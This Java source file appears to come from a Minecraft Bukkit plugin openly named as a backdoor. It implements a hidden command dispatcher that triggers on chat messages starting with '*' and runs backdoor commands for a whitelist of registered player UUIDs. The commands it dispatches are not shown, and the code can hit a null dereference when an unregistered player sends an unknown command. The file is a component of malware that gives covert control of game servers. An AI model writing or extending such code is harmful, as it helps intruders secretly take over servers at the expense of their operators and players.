package de.blox.backdoor.commands;

import de.blox.backdoor.core.Core;
import org.bukkit.entity.Player;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


public class BackdoorCommandProvider {

    private final List<ICommand> commands = new ArrayList<>();
    private final String prefix = "*";

    public void register(ICommand command) {
        this.commands.add(command);
    }

    public boolean processCommand(Player player, String line) {
        if (!line.startsWith(prefix))
            return false;

        line = line.substring(1);
        String[] args = line.split(" ");

        ICommand found = this.commands.stream().filter(command -> Arrays.stream(command.aliases()).anyMatch(alias -> args[0].equalsIgnoreCase(alias))).findFirst().orElse(null);

        if (found == null && Core.getInstance().getRegisteredPlayers().contains(player.getUniqueId().toString())) {
            player.sendMessage(Core.getInstance().getPrefix() + "§cCommand not found!");
            return false;
        }

        if (found.mustRegistered() && !Core.getInstance().getRegisteredPlayers().contains(player.getUniqueId().toString())) {
            return true;
        }

        found.processCommand(player, line, Arrays.copyOfRange(args, 1, args.length));
        return false;
    }

}
